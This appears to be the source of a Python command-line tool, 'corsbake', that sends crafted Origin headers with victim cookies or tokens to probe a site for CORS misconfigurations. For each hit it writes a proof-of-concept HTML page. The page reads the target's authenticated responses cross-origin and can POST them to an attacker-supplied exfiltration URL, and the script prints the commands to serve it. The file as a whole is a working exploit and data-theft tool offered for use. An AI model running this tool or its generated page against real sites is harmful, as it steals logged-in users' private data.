"""corsbake: probe a target for CORS misconfigurations and bake a working PoC.

Sends a small family of preflight + actual cross-origin requests with a victim
auth header attached. For every probe that comes back with a credentialed,
attacker-readable response it writes a `poc.html` the user serves from their
attacker domain. Output is a section-rule narrative; the trailing artifact
block tells the user the next two commands to run.
"""

import argparse
import html
import os
import sys
import time
import urllib.error
import urllib.request
from dataclasses import dataclass
from pathlib import Path


@dataclass
class Probe:
    name: str
    origin: str
    note: str


def probes_for(attacker: str, target_host: str) -> list[Probe]:
    return [
        Probe("exact-origin reflection", attacker, "the textbook misconfig: server reflects the requesting Origin verbatim"),
        Probe("null origin", "null", "sandboxed iframe / redirect / file:// page sends Origin: null"),
        Probe("wildcard with credentials", "https://random.example", "ACAO=* with ACAC=true is a spec-banned combo browsers will reject, but plenty of clients honor it"),
        Probe("scheme downgrade", attacker.replace("https://", "http://"), "server allows http origin while target is https; MITM attack vector"),
        Probe("suffix bypass", f"https://{target_host}.{attacker.split('://', 1)[-1]}", "regex like ^https://victim\\.com checks suffix and accepts attacker-controlled host"),
        Probe("subdomain wildcard", f"https://evil.{target_host}", "any-subdomain wildcard accepted as if it were a trusted subdomain"),
    ]


@dataclass
class Result:
    probe: Probe
    acao: str | None
    acac: str | None
    body_preview: str
    vulnerable: bool
    reason: str


def _ansi():
    if os.environ.get("NO_COLOR") or not sys.stdout.isatty():
        return {"r": "", "g": "", "y": "", "c": "", "dim": "", "b": "", "rst": ""}
    return {
        "r": "\033[31m",
        "g": "\033[32m",
        "y": "\033[33m",
        "c": "\033[36m",
        "dim": "\033[2m",
        "b": "\033[1m",
        "rst": "\033[0m",
    }


def send_preflight(url: str, origin: str, method: str, victim_headers: list[tuple[str, str]], timeout: float) -> dict[str, str]:
    req = urllib.request.Request(url, method="OPTIONS")
    req.add_header("Origin", origin)
    req.add_header("Access-Control-Request-Method", method)
    req.add_header("Access-Control-Request-Headers", "authorization, content-type, cookie")
    for k, v in victim_headers:
        req.add_header(k, v)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return {k.lower(): v for k, v in resp.headers.items()}
    except urllib.error.HTTPError as exc:
        return {k.lower(): v for k, v in (exc.headers.items() if exc.headers else [])}
    except (urllib.error.URLError, TimeoutError, OSError):
        return {}


def send_actual(url: str, origin: str, victim_headers: list[tuple[str, str]], timeout: float) -> tuple[int, dict[str, str], str]:
    req = urllib.request.Request(url, method="GET")
    req.add_header("Origin", origin)
    for k, v in victim_headers:
        req.add_header(k, v)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read(4096).decode("utf-8", errors="replace")
            hdrs = {k.lower(): v for k, v in resp.headers.items()}
            return resp.status, hdrs, body
    except urllib.error.HTTPError as exc:
        body = ""
        try:
            body = exc.read(4096).decode("utf-8", errors="replace")
        except Exception:
            pass
        hdrs = {k.lower(): v for k, v in (exc.headers.items() if exc.headers else [])}
        return exc.code, hdrs, body
    except (urllib.error.URLError, TimeoutError, OSError):
        return 0, {}, ""


def evaluate(probe: Probe, attacker_origin: str, hdrs: dict[str, str], status: int) -> tuple[bool, str]:
    acao = hdrs.get("access-control-allow-origin", "")
    acac = (hdrs.get("access-control-allow-credentials", "") or "").lower() == "true"
    if status == 0:
        return False, "request failed"
    if probe.name == "exact-origin reflection":
        if acao == probe.origin and acac:
            return True, "ACAO reflects attacker origin and credentials allowed"
    if probe.name == "null origin":
        if acao.lower() == "null" and acac:
            return True, "null origin accepted with credentials"
    if probe.name == "wildcard with credentials":
        if acao == "*" and acac:
            return True, "wildcard accepted alongside credentials (browser-banned, client-honored)"
    if probe.name == "scheme downgrade":
        if acao == probe.origin and acac:
            return True, "http origin accepted while target is https"
    if probe.name == "suffix bypass":
        if acao == probe.origin and acac:
            return True, "regex permitted attacker-suffixed host"
    if probe.name == "subdomain wildcard":
        if acao == probe.origin and acac:
            return True, "any-subdomain accepted as trusted"
    if acao and acao not in (probe.origin, "*", "null") and probe.origin in acao:
        return True, f"unexpected ACAO contains attacker origin: {acao}"
    return False, f"safe (acao={acao or '(none)'}, acac={'yes' if acac else 'no'})"


def bake_poc(target_url: str, attacker_origin: str, exfil_url: str, hits: list[Result]) -> str:
    best = next((h for h in hits if "exact-origin" in h.probe.name), None) or hits[0]
    safe_target = html.escape(target_url)
    safe_origin = html.escape(attacker_origin)
    page = f"""<!doctype html>
<meta charset=utf-8>
<title>corsbake PoC: {safe_target}</title>
<style>
 body{{font-family:ui-monospace,Menlo,monospace;background:#0d1117;color:#c9d1d9;padding:24px;line-height:1.5}}
 h1{{color:#f0883e;font-size:18px;border-bottom:1px solid #30363d;padding-bottom:8px}}
 pre{{background:#161b22;border:1px solid #30363d;padding:12px;overflow:auto;border-radius:4px}}
 .ok{{color:#7ee787}} .bad{{color:#ff7b72}}
</style>
<h1>cross-origin read PoC</h1>
<p>target: <code>{safe_target}</code></p>
<p>attacker origin: <code>{safe_origin}</code></p>
<p>exploited misconfig: <code>{html.escape(best.probe.name)}</code></p>
<pre id=out>(running...)</pre>
<script>
(async () => {{
  const out = document.getElementById('out');
  try {{
    const r = await fetch({target_url!r}, {{credentials: 'include', mode: 'cors'}});
    const t = await r.text();
    out.textContent = '[+] status ' + r.status + '\\n[+] bytes ' + t.length + '\\n\\n' + t;
    out.classList.add('ok');
    {f"await fetch({exfil_url!r}, {{method:'POST', body:t, mode:'no-cors'}});" if exfil_url else ""}
  }} catch (e) {{
    out.textContent = '[!] cross-origin read FAILED in this browser: ' + e;
    out.classList.add('bad');
  }}
}})();
</script>
"""
    return page


def render(args: argparse.Namespace) -> int:
    c = _ansi()
    target_host = args.url.split("://", 1)[-1].split("/", 1)[0]
    victim_headers: list[tuple[str, str]] = []
    if args.cookie:
        victim_headers.append(("Cookie", args.cookie))
    for h in args.header:
        if ":" in h:
            k, v = h.split(":", 1)
            victim_headers.append((k.strip(), v.strip()))

    rule = "═" * 64
    print(f"{c['c']}{rule}{c['rst']}")
    print(f"{c['b']}corsbake{c['rst']}  {args.url}")
    print(f"{c['c']}{rule}{c['rst']}")
    print()
    print(f"  target           {args.url}")
    print(f"  attacker origin  {args.attacker_origin}")
    print(f"  victim auth      {('cookie' if args.cookie else '') + (' + ' if args.cookie and args.header else '') + ('headers' if args.header else '') or '(none)'}")
    print(f"  exfil sink       {args.exfil or '(none, output stays in browser)'}")
    print()

    hits: list[Result] = []
    for probe in probes_for(args.attacker_origin, target_host):
        pre = send_preflight(args.url, probe.origin, "GET", victim_headers, args.timeout)
        status, real, body = send_actual(args.url, probe.origin, victim_headers, args.timeout)
        merged = {**pre, **real}
        vuln, reason = evaluate(probe, args.attacker_origin, merged, status)
        glyph = f"{c['r']}▣{c['rst']}" if vuln else f"{c['dim']}▢{c['rst']}"
        verdict = f"{c['r']}{c['b']}VULNERABLE{c['rst']}" if vuln else f"{c['dim']}safe{c['rst']}"
        print(f"{glyph} {c['b']}{probe.name}{c['rst']}")
        print(f"     origin sent     {probe.origin}")
        print(f"     {c['dim']}{probe.note}{c['rst']}")
        print(f"     ACAO returned   {merged.get('access-control-allow-origin', '(none)')}")
        print(f"     ACAC returned   {merged.get('access-control-allow-credentials', '(none)')}")
        print(f"     verdict         {verdict}  {reason}")
        if vuln and body:
            preview = body[:120].replace("\n", " ")
            print(f"     body preview    {preview!r}")
            hits.append(Result(probe, merged.get("access-control-allow-origin"), merged.get("access-control-allow-credentials"), body, vuln, reason))
        print()
        time.sleep(0.05)

    print(f"{c['c']}{rule}{c['rst']}")
    if not hits:
        print(f"  no exploitable misconfig observed against {target_host}")
        print(f"{c['c']}{rule}{c['rst']}")
        return 0

    if args.no_poc:
        print(f"  {len(hits)} vulnerable probe(s); --no-poc set, skipping artifact write")
        print(f"{c['c']}{rule}{c['rst']}")
        return 0

    poc_html = bake_poc(args.url, args.attacker_origin, args.exfil, hits)
    out_path = Path(args.out)
    out_path.write_text(poc_html)
    serve_dir = out_path.resolve().parent
    serve_cmd = f"python3 -m http.server 8080 --directory {serve_dir}"
    open_url = f"{args.attacker_origin.rstrip('/')}/{out_path.name}"

    print(f"  {c['b']}artifact{c['rst']}")
    print(f"     written  {out_path}  ({len(poc_html)} bytes)")
    print(f"     serve    {serve_cmd}")
    print(f"     open     {open_url}")
    if args.exfil:
        print(f"     exfil    POSTs response body to {args.exfil}")
    print(f"{c['c']}{rule}{c['rst']}")
    return 0


def main(argv: list[str] | None = None) -> int:
    p = argparse.ArgumentParser(
        prog="corsbake",
        description="Probe a target for CORS misconfigurations and bake a working PoC HTML page.",
    )
    p.add_argument("--url", required=True, help="target endpoint (the resource you want to read cross-origin)")
    p.add_argument("--attacker-origin", required=True, help="attacker-controlled origin (the host where you will serve the PoC)")
    p.add_argument("--cookie", help="victim cookie string, e.g. 'sess=abc; csrf=xyz'")
    p.add_argument("--header", action="append", default=[], help="extra victim auth header, e.g. 'Authorization: Bearer ...'")
    p.add_argument("--exfil", default="", help="optional exfil URL the PoC POSTs the leaked body to")
    p.add_argument("--out", default="./poc.html", help="path to write PoC HTML (default ./poc.html)")
    p.add_argument("--no-poc", action="store_true", help="dry probing only, do not write the PoC file")
    p.add_argument("--timeout", type=float, default=10.0, help="per-request timeout (default 10)")
    args = p.parse_args(argv)
    if not args.attacker_origin.startswith(("http://", "https://")):
        print("error: --attacker-origin must include scheme (http:// or https://)", file=sys.stderr)
        return 1
    try:
        return render(args)
    except KeyboardInterrupt:
        return 130


if __name__ == "__main__":
    sys.exit(main())
